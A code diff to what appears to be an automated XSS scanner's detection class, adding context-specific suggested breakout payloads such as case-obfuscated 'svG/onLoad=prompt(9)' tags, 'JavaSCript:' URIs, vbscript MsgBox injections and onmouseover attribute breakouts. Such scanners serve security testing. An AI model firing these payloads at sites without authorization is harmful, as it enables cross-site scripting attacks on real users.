@@ -10,6 +10,7 @@ import lxml.etree
 import lxml.html
 from lxml.html import soupparser, fromstring
 import itertools
+from IPython import embed
 
 class XSSCharFinder(object):
     def __init__(self):
@@ -80,7 +81,7 @@ class XSSCharFinder(object):
         # Catches DB errors
         pl_lines_found = self.payloaded_lines(body, orig_payload)
         if pl_lines_found:
-            item = self.make_item(meta, resp_url, pl_lines_found, orig_payload)
+            item = self.make_item(meta, resp_url, pl_lines_found, orig_payload, None)
             if item:
                 if item['xss_place'] == 'url':
                     item = self.url_item_filtering(item, spider)
@@ -101,18 +102,30 @@ class XSSCharFinder(object):
         #tag_index, tag, attr, attr_val, payload, unfiltered_chars, line = injection
         # get_unfiltered_chars() can only return a string 0+ characters, but never None
         unfiltered_chars = injection[5]
+        payload = injection[4]
+        if ';' in unfiltered_chars:
+            payload += ';9'
+        line = injection[6]+payload
+        item_found = None
+
         # get_unfiltered_chars() always returns a string
         if len(unfiltered_chars) > 0:
-            breakout_chars = self.get_breakout_chars(injection, resp_url)
+            chars_payloads = self.get_breakout_chars(injection, resp_url)
             # breakout_chars always returns a , never None
-            if len(breakout_chars) > 0:
-                for chars in breakout_chars:
-                    if chars.issubset(set(unfiltered_chars)):
-                        payload = injection[4]
-                        if ';' in unfiltered_chars:
-                            payload += ';9'
-                        line = injection[6]+payload
-                        return self.make_item(meta, resp_url, line, unfiltered_chars)
+            if len(chars_payloads) > 0:
+                sugg_payloads = []
+                for chars in chars_payloads:
+                    if set(chars).issubset(set(unfiltered_chars)):
+                        # Get rid of possible payloads with > in them if > not in unfiltered_chars
+                        item_found = True
+                        for possible_payload in chars_payloads[chars]:
+                            if '>' not in unfiltered_chars:
+                                if '>' in possible_payload:
+                                    continue
+                            sugg_payloads.append(possible_payload)
+
+                if item_found:
+                    return self.make_item(meta, resp_url, line, unfiltered_chars, sugg_payloads)
 
     def get_breakout_chars(self, injection, resp_url):
         ''' Returns either None if no breakout chars were found
@@ -124,46 +137,97 @@ class XSSCharFinder(object):
         full_match = '%s.{0,80}?%s' % (pl_delim, pl_delim)
         line = re.sub(full_match, 'INJECTION', line)
 
-        breakout_chars = []
+        all_chars_payloads = {}
 
         # Comment injection
         if tag == '!--':
-            breakout_chars.append(set('>'))
+            chars = ('>')
+            payload = '--><svG/onLoad=prompt(9)>'
+            try:
+                all_chars_payloads[chars] += [payload]
+            except KeyError:
+                all_chars_payloads[chars] = [payload]
 
         # Attribute injection
         elif attr:
-            breakout_chars = self.attr_breakout(tag, attr, attr_val, pl_delim, line)
+            chars_payloads = self.attr_breakout(tag, attr, attr_val, pl_delim, line)
+            for k in chars_payloads:
+                try:
+                    all_chars_payloads[k] += chars_payloads[k]
+                except KeyError:
+                    all_chars_payloads[k] = chars_payloads[k]
 
         # Between tag injection
         else:
-            tag_bo_chars = self.tag_breakout(tag, line)
-            for bo_chars in tag_bo_chars:
-                if len(tag_bo_chars) > 0:
-                    breakout_chars.append(bo_chars)
+            chars_payloads = self.tag_breakout(tag, line)
+            for k in chars_payloads:
+                try:
+                    all_chars_payloads[k] += chars_payloads[k]
+                except KeyError:
+                    all_chars_payloads[k] = chars_payloads[k]
 
-        return breakout_chars
+        # Dedupe the list of potential payloads
+        for chars in all_chars_payloads:
+            all_chars_payloads[chars] = list(set(all_chars_payloads[chars]))
+
+        return all_chars_payloads
 
     def tag_breakout(self, tag, line):
-        breakout_chars = []
+        chars_payloads = {}
 
         # Look for javascript breakouts
         if tag == 'script':
             # Get rid of javascript escaped quotes
             dquote_open, squote_open = self.get_quote_context(line)
             if dquote_open:
-                breakout_chars.append(set(['"']))
+                chars = ('"')
+                payload = 'x";prompt(9);'
+                try:
+                    chars_payloads[chars].append(payload)
+                except KeyError:
+                    chars_payloads[chars] = [payload]
+
             if squote_open:
-                breakout_chars.append(set(["'"]))
+                chars = ("'")
+                payload = "x';prompt(9);"
+                try:
+                    chars_payloads[chars].append(payload)
+                except KeyError:
+                    chars_payloads[chars] = [payload]
+
+                chars = ('<', '>')
+                payload = '<svG/onLoad=prompt(9)>'
+                try:
+                    chars_payloads[chars].append(payload)
+                except KeyError:
+                    chars_payloads[chars] = [payload]
+
             # If neither double nor single quotes are open at injection point, we just need a ;
             if not dquote_open and not squote_open:
-                breakout_chars.append(set([';']))
-                breakout_chars.append(set(['<', '>']))
+                chars = (";")
+                payload = ';prompt(9);'
+                try:
+                    chars_payloads[chars].append(payload)
+                except KeyError:
+                    chars_payloads[chars] = [payload]
+
+                chars = ("<", ">")
+                payload = '</SCript><svG/onLoad=prompt(9)>'
+                try:
+                    chars_payloads[chars].append(payload)
+                except KeyError:
+                    chars_payloads[chars] = [payload]
 
         # Everything that's not a script tag
         else:
-            breakout_chars.append(set(['<','>']))
+            chars = ("<", ">")
+            payload = '<svG/onLoad=prompt(9)>'
+            try:
+                chars_payloads[chars].append(payload)
+            except KeyError:
+                chars_payloads[chars] = [payload]
 
-        return breakout_chars
+        return chars_payloads
 
     def get_attr_quote(self, attr, line):
         ''' Return the first quote in the string which
@@ -175,9 +239,10 @@ class XSSCharFinder(object):
         attr_split_lines = line.split(attr, 1) #[0] is ''
         if len(attr_split_lines) > 1:
             attr_split_line = attr + attr_split_lines[1]
-            attr_quote = re.search('(\'|")', attr_split_line)
+            # match starts with =, then find any amount of space (nongreedy with ?) until either ' or "
+            attr_quote = re.search('=\s*?(\'|")', attr_split_line)
             if attr_quote:
-                attr_quote = attr_quote.group()
+                attr_quote = attr_quote.group(1)
             else:
                 attr_quote = None
 
@@ -185,6 +250,10 @@ class XSSCharFinder(object):
 
     def attr_breakout(self, tag, attr, attr_val, delim, line):
         breakout_chars = []
+        sugg_payload = []
+        chars_payloads = {}
+        dquote_open, squote_open = self.get_quote_context(line)
+        attr_quote = self.get_attr_quote(attr, line)
 
         # javascript:alert(1) vulns
         # We do this slicing operation because ;9 might be at the end
@@ -192,67 +261,133 @@ class XSSCharFinder(object):
         if attr_val[:len(delim+'subbed')] == delim+'subbed':
             if tag == 'a' and attr == 'href':
                 # Only need : ( and ) to use javascript:prompt(4) redir payload
-                breakout_chars.append(set([':', ')', '(']))
+                chars = (':', '(', ')')
+                payload = 'JavaSCript:prompt(9)'
+                try:
+                    chars_payloads[chars].append(payload)
+                except KeyError:
+                    chars_payloads[chars] = [payload]
+
             # Inject the frame or script source file
             elif tag in ['script', 'frame', 'iframe']:
                 if attr == 'src':
-                    breakout_chars.append(set([':', ')', '(']))
+                    chars = (':', '(', ')')
+                    payload = 'JavaSCript:prompt(9)'
+                    try:
+                        chars_payloads[chars].append(payload)
+                    except KeyError:
+                        chars_payloads[chars] = [payload]
+
+        # Catching src=vbscript:...
+        # Exploit: msgbox (document.domain)
+        if re.match('vbscript:', attr_val):
+            if dquote_open and squote_open:
+                vbs_quote = self.opposite_quote(attr_quote)
+                chars = ("x", vbs_quote)
+                payload = vbs_quote + '%0a%0dMsgBox (xss)'
+                try:
+                    chars_payloads[chars].append(payload)
+                except KeyError:
+                    chars_payloads[chars] = [payload]
+
+            else:
+                chars = ("x")
+                payload = "%0a%0dMsgBox (xss)"
+                try:
+                    chars_payloads[chars].append(payload)
+                except KeyError:
+                    chars_payloads[chars] = [payload]
+
+        # Catching src=javascript:...
+        if re.match('javascript:', attr_val):
+            if dquote_open and squote_open:
+                js_quote = self.opposite_quote(attr_quote)
+                chars = (js_quote, ";")
+                payload = js_quote+";prompt(9);"
+                try:
+                    chars_payloads[chars].append(payload)
+                except KeyError:
+                    chars_payloads[chars] = [payload]
+
+            else:
+                chars = (";")
+                payload = ";prompt(9);"
+                try:
+                    chars_payloads[chars].append(payload)
+                except KeyError:
+                    chars_payloads[chars] = [payload]
+
+        # Check for JS attributes
+        if attr in self.event_attributes():
+            if dquote_open and squote_open:
+                js_quote = self.opposite_quote(attr_quote)
+                chars = (";", js_quote)
+                payload = 'x'+js_quote+';prompt(9);'+js_quote
+                try:
+                    chars_payloads[chars].append(payload)
+                except KeyError:
+                    chars_payloads[chars] = [payload]
+
+            elif not dquote_open and not squote_open:
+                chars = (";")
+                payload = ';prompt(9);'
+                try:
+                    chars_payloads[chars].append(payload)
+                except KeyError:
+                    chars_payloads[chars] = [payload]
+
+            #elif squote_open and not dquote_open:
+            else:
+                chars = (";")
+                payload = ";prompt(9);"
+                try:
+                    chars_payloads[chars].append(payload)
+                except KeyError:
+                    chars_payloads[chars] = [payload]
+
 
         # Check if quotes even exist in the line
         if '"' in line or "'" in line:
-            attr_quote = self.get_attr_quote(attr, line)
             if not attr_quote:
-                breakout_chars.append(set(['<', '>']))
-
-            dquote_open, squote_open = self.get_quote_context(line)
-            if dquote_open:
-                breakout_chars.append(set(['"']))
-            if squote_open:
-                breakout_chars.append(set(["'"]))
-
-            # Check for JS attributes
-            if attr in self.event_attributes():
-                # Scared this is too lenient. Possible source of false positives?
-                if dquote_open and not squote_open:
-                    breakout_chars.append(set([';']))
-                elif squote_open and not dquote_open:
-                    breakout_chars.append(set([';']))
-
-            # Catching src=javascript:... 
-            if re.match('javascript:', attr_val):
-                # Scared this is too lenient. Possible source of false positives?
-                if dquote_open and not squote_open:
-                    breakout_chars.append(set([';']))
-                elif squote_open and not dquote_open:
-                    breakout_chars.append(set([';']))
-
-            # Catching src=vbscript:... 
-            # Exploit: msgbox (document.domain)
-            elif re.match('vbscript:', attr_val):
-                if dquote_open and not squote_open:
-                    breakout_chars.append(set(['x']))
-                elif squote_open and not dquote_open:
-                    breakout_chars.append(set(['x']))
-
-            # NonJS attribute injection where only html quote breaks out
+                chars = ('<', '>')
+                payload = 'x><svG/onLoad=prompt(9)>'
+                try:
+                    chars_payloads[chars].append(payload)
+                except KeyError:
+                    chars_payloads[chars] = [payload]
             else:
-                if attr_quote:
-                    breakout_chars.append(set(attr_quote))
-                else:
-                    # Hail mary, no quotes found but definitely inside attr
-                    breakout_chars.append(set(['"', "'", ">", "<"]))
+                chars = (attr_quote)
+                payload1 = 'x'+attr_quote+'x><svG/onLoad=prompt(9)>'
+                payload2 = 'x'+attr_quote+' onmouseover=prompt(9) '+attr_quote
+                payload3 = 'x'+attr_quote+'/onmouseover=prompt(9)/'+attr_quote
+                try:
+                    chars_payloads[chars].append(payload1)
+                    chars_payloads[chars].append(payload2)
+                    chars_payloads[chars].append(payload3)
+                except KeyError:
+                    chars_payloads[chars] = [payload1, payload2, payload3]
 
         # If no quotes are open or they're just not found:
         else:
             # means you can inject your own attribute value like:
             # x src=http://exploit.com
             if tag in ['script', 'frame', 'iframe']:
-                breakout_chars.append(set([':', ')', '(']))
-            else:
-                #No quotes found but definitely inside attr
-                breakout_chars.append(set([">", "<"]))
+                chars = (':', ')', '(')
+                payload = 'x src=JaVaSCript:prompt(9)'
+                try:
+                    chars_payloads[chars].append(payload)
+                except KeyError:
+                    chars_payloads[chars] = [payload]
 
-        return breakout_chars
+            else:
+                chars = ("<", ">")
+                payload = 'x><svG/onLoad=prompt(9)>'
+                try:
+                    chars_payloads[chars].append(payload)
+                except KeyError:
+                    chars_payloads[chars] = [payload]
+
+        return chars_payloads
 
     def get_quote_context(self, line):
         ''' Goes through char by char to determine if double
@@ -290,6 +425,15 @@ class XSSCharFinder(object):
         else:
             obj = True
         return obj
+
+    def opposite_quote(self, quote):
+        ''' Return the opposite quote of the one give, single for double or
+        double for single '''
+        if quote == '"':
+            oppo_quote = "'"
+        else:
+            oppo_quote = '"'
+        return oppo_quote
 
     def get_lxml_matches(self, full_match, body, resp_url, delim):
         # Replace the payloaded string with just the delim string (minus the ; )
@@ -332,7 +476,6 @@ class XSSCharFinder(object):
         #    return
         
         return doc
-
 
     def combine_regex_lxml(self, lxml_injs, full_matches, scolon_matches, body, mismatch):
         ''' Combine lxml injection data with the 2 regex injection search data '''
@@ -433,7 +576,7 @@ class XSSCharFinder(object):
                 pl_lines_found.append(line)
         return pl_lines_found
 
-    def make_item(self, meta, resp_url, line, unfiltered):
+    def make_item(self, meta, resp_url, line, unfiltered, sugg_payloads):
         item = vuln()
         ''' Create the vuln item '''
 
@@ -447,6 +590,8 @@ class XSSCharFinder(object):
         item['xss_place'] = meta['xss_place']
         item['orig_url'] = meta['orig_url']
         item['resp_url'] = resp_url
+        if sugg_payloads:
+            item['sugg_payloads'] = ', '.join(sugg_payloads)
         if 'POST_to' in meta:
             item['POST_to'] = meta['POST_to']
 
@@ -590,15 +735,6 @@ class XSSCharFinder(object):
 
         return payload
 
-    def opposite_quote(self, quote):
-        ''' Return the opposite quote of the one give, single for double or
-        double for single '''
-        if quote == '"':
-            oppo_quote = "'"
-        else:
-            oppo_quote = '"'
-        return oppo_quote
-
     def get_unfiltered_chars(self, payload, delim, scolon_matches, match_offset):
         ''' Check for the special chars and append them to a master list of tuples, one tuple per injection point '''
 
@@ -711,6 +847,10 @@ class XSSCharFinder(object):
 
             f.write('Injection point: '+item['xss_param']+'\n')
             spider.log('    Injection point: '+item['xss_param'], level='INFO')
+
+            if 'sugg_payloads' in item:
+                f.write('Possible payloads: '+item['sugg_payloads']+'\n')
+                spider.log('    Possible payloads: '+item['sugg_payloads'], level='INFO')
 
             # Cut off the line at 500
             #f.write('Line: '+item['line'][-500:]+'\n')
